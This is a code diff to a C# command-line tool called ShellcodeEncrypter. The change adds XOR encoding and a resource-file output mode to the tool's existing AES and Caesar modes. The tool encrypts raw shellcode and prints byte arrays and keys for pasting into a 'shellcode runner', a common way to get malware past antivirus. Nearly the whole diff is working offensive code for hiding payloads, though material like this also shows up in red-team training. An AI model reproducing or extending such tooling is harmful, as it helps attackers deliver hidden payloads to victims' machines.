@@ -1,63 +1,124 @@
-﻿using System;
-using System.Text;
-using System.Security.Cryptography;
+﻿using CommandLine;
+using System;
 using System.IO;
+using System.Security.Cryptography;
+using System.Text;
 
 namespace ShellcodeEncrypter
 {
     class Program
     {
         private static readonly byte[] Salt = new byte[] { 15, 25, 35, 45, 55, 65, 75, 85 };
+
+        class Options
+        {
+            [Option('i', "input", Required = true, HelpText = "Input file to be processed.")]
+            public string inputBin { get; set; }
+
+            [Option('m', "mode", Required = true, HelpText = "Encryption/encoding mode (aesCS,ceasarCS,ceasarVBA,xorCS)")]
+            public string encMode { get; set; }
+
+            [Option('r', "resource", Required = false,Default = false, HelpText = "Output as an embeded resource file (normal is copy and paste code)")]
+            public bool outAsResource { get; set; }
+
+        }
         static void Main(string[] args)
         {
-            // make sure we have right number of args
-            if (args.Length != 2)
-            {
-                usage();
-                return;
-            }
 
-            string encMode = args[0];
-            string inputBin = args[1];
-            Console.WriteLine("encMode=" + encMode + " | inputBin=" + inputBin);
+            Parser.Default.ParseArguments<Options>(args)
+                   .WithParsed<Options>(o =>
+                   {
+                       //ensure bin file exists
+                       if (!File.Exists(o.inputBin))
+                       {
+                           Console.WriteLine("[!] Error: input bin does not exist");
+                           return;
+                       }
+                       Console.WriteLine("encMode=" + o.encMode + " | inputBin=" + o.inputBin);
 
-            // ensure bin file exists
-            if (!File.Exists(inputBin))
-            {
-                Console.WriteLine("[!] Error: input bin does not exist");
-            }
 
-            // read in bytes
-            Console.WriteLine("[+] Initializing...");
-            Console.WriteLine("[+] Reading bytes from: " + inputBin);
-            byte[] buf = File.ReadAllBytes(inputBin);
+                       // read in bytes
+                       Console.WriteLine("[+] Initializing...");
+                       Console.WriteLine("[+] Reading bytes from: " +o.inputBin);
+                       byte[] buf = File.ReadAllBytes(o.inputBin);
 
-            Console.WriteLine("[+] Read bytes: " + buf.Length);
+                       Console.WriteLine("[+] Read bytes: " + buf.Length);
 
-            // encrypt
-            if (encMode == "aesCS")
-            {
-                AesEncrypt(buf);
-            } else if (encMode == "caesarVBA")
-            {
-                CaesarVBAEncrypt(buf);
-            }
-            else if (encMode.Equals("caesarcsharp", StringComparison.OrdinalIgnoreCase))
-            {
-                CaesarCsharp(buf);
-            }
-            else
-            {
-                Console.WriteLine("[!] Error: unknown encryption mode");
-            }
+                       // encrypt
+                       if (o.encMode.Equals("aescs", StringComparison.OrdinalIgnoreCase))
+                       {
+                           AesEncrypt(buf, o.outAsResource);
+                       }
+                       else if (o.encMode.Equals("caesarvba", StringComparison.OrdinalIgnoreCase))
+                       {
+                           CaesarVBAEncrypt(buf);
+                       }
+                       else if (o.encMode.Equals("ceasarcs", StringComparison.OrdinalIgnoreCase))
+                       {
+                           CaesarCsharp(buf, o.outAsResource);
+                       }
+                       else if (o.encMode.Equals("xorcs", StringComparison.OrdinalIgnoreCase))
+                       {
+                           XORCsharp(buf, o.outAsResource);
+                       }
+                       else
+                       {
+                           Console.WriteLine("[!] error: unknown encryption mode");
+                       }
+                   });
+
+
+       
 
             return;
         }
-        private static void usage()
+        private static string RandString(int length)
         {
-            Console.WriteLine(@".\LikesEncoder.exe <aes|vba> c:\path\to\shellcode.bin");
+            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            var stringChars = new char[length];
+            var random = new Random();
+
+            for (int i = 0; i < stringChars.Length; i++)
+            {
+                stringChars[i] = chars[random.Next(chars.Length)];
+            }
+
+            var finalString = new String(stringChars);
+            return finalString;
         }
-        private static void AesEncrypt(byte[] buf)
+        private static void XORCsharp(byte[] buf, bool asResource)
+        {
+            var key = RandString(28);
+            var kL = key.Length;
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)((uint)buf[i] ^ (byte)key[i % kL]);
+            }
+
+
+            var csOut = "";
+            if (asResource)
+            {
+                string outfile = "security.txt";
+                File.WriteAllBytes(outfile, buf);
+                Console.WriteLine("[+] Output file: " + outfile);
+            } else {
+                csOut = "byte[] encryptedShellcode = new byte[] {" + ToHex(buf) + "};";
+            }
+
+
+            Console.WriteLine("[+] Copy & paste into shellcode runner");
+            Console.WriteLine("-----");
+            if (!asResource)
+            {
+                Console.WriteLine(csOut);
+                Console.WriteLine();
+            }
+
+            Console.WriteLine("string key = \""+key+"\";");
+            Console.WriteLine("-----");
+        }    
+        private static void AesEncrypt(byte[] buf, bool asResource)
         {
             Aes encryptor = Aes.Create();
             encryptor.Mode = CipherMode.CBC;
@@ -76,13 +137,28 @@ namespace ShellcodeEncrypter
             cryptoStream.FlushFinalBlock();
             byte[] encoded = memoryStream.ToArray();
 
-            string outfile = "security.txt";
-            File.WriteAllBytes(outfile, encoded);
-            Console.WriteLine("[+] Output file: " + outfile);
-            //Console.WriteLine("byte[] encrypted = new byte[" + encoded.Length + "] {" + ToHex(encoded) + "};");
+            
+
+
+            var csOut = "";
+            if (asResource)
+            {
+                string outfile = "security.txt";
+                File.WriteAllBytes(outfile, encoded);
+                Console.WriteLine("[+] Output file: " + outfile);
+            }
+            else
+            {
+                csOut = "byte[] encryptedShellcode = new byte[] {" + ToHex(encoded) + "};";
+            }
 
             Console.WriteLine("[+] Copy & paste into shellcode runner");
             Console.WriteLine("-----");
+            if (!asResource)
+            {
+                Console.WriteLine(csOut);
+                Console.WriteLine();
+            }
             Console.WriteLine("byte[] iv = new byte[" + encryptor.IV.Length + "] {" + ToHex(encryptor.IV) + "};");
             Console.WriteLine("byte[] key = new byte[" + encryptor.Key.Length + "] {" + ToHex(encryptor.Key) + "};");
             Console.WriteLine("-----");
@@ -153,7 +229,7 @@ namespace ShellcodeEncrypter
 
             return;
         }
-        private static void CaesarCsharp(byte[] buf)
+        private static void CaesarCsharp(byte[] buf,bool asResource)
         {
             byte[] encoded = new byte[buf.Length];
 
@@ -165,11 +241,27 @@ namespace ShellcodeEncrypter
             StringBuilder hex = new StringBuilder(encoded.Length * 2);
             foreach (byte b in encoded)
             {
-                
+
                 hex.AppendFormat("0x{0:x2}, ", b);
             }
 
-            Console.WriteLine("The payload is:\n" + "byte[] buf = new byte[" + encoded.Length + "] { " + hex.ToString().Remove(hex.Length - 2) + " };");
+            var csOut = "";
+            if (asResource)
+            {
+                string outfile = "security.txt";
+                File.WriteAllBytes(outfile, encoded);
+                Console.WriteLine("[+] Output file: " + outfile);
+            }
+            else
+            {
+                csOut = "byte[] encryptedShellcode = new byte[] {" + hex.ToString().Remove(hex.Length - 2) + "};";
+                Console.WriteLine("[+] Copy & paste into shellcode runner");
+                Console.WriteLine("-----");
+                Console.WriteLine(csOut);
+                Console.WriteLine("-----");
+            }
+
+           // Console.WriteLine("The payload is:\n" + "byte[] buf = new byte[" + encoded.Length + "] { " + hex.ToString().Remove(hex.Length - 2) + " };");
 
             return;
         }
